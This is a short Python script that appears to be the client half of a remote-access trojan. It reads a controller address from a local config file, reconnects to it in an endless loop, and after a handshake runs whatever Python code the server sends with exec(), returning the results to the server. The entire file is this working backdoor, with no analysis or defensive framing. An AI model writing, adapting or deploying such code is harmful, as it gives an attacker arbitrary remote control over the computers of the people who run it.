import socket
import datetime
import json
import os

def t():
    current_time = datetime.datetime.now()
    return current_time.strftime("%Y %m %d %H:%M:%S")

def start_client(host='192.168.10.21', port=8081):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            while True:
                try:
                    s.connect((host, port))
                    message = "client in."
                    s.sendall(message.encode('utf-8'))
                    break
                except ConnectionRefusedError:
                    pass
                except TimeoutError:
                    pass
            while True:            
                data = s.recv(8192)
                if not data:
                    break
                if data.decode("utf-8") == "running? answer:Y":
                    message = "Y"
                    s.sendall(message.encode('utf-8'))
                    while True:
                        try:
                            data = s.recv(8192)
                            if not data:
                                break
                            data_str = data.decode("utf-8")
                            data_list = data_str.split("\n")
                            data_str = ""
                            print(data_str)
                            for i in range(len(data_list) - 9):
                                data_str += data_list[i + 9] + "\n"
                            global send_return
                            exec(data_str)
                            s.sendall(send_return.encode("utf-8"))
                        except Exception as e:
                            error_message = f"emm…… 有一个错误耶    (•̀ ω •́) y.\n{e}"
                            s.sendall(error_message.encode('utf-8'))
                            break
    except Exception as e:
        try:
            Error = "NoneError:nothing"
            s.sendall(Error.encode("utf-8"))
        except ConnectionResetError:
            pass
        except OSError:
            pass
if __name__ == "__main__":
    with open("D:\Data_horse\ins.SQL_horse") as file:
        a = file.read()
    dict_str = a.split('=')[1].strip()
    dict_str = dict_str.replace("'", '"')
    ins_dict = json.loads(dict_str)
    print(ins_dict.get("ip"), ":", ins_dict.get("port"))
    while True:
        start_client(ins_dict.get("ip"), ins_dict.get("port"))
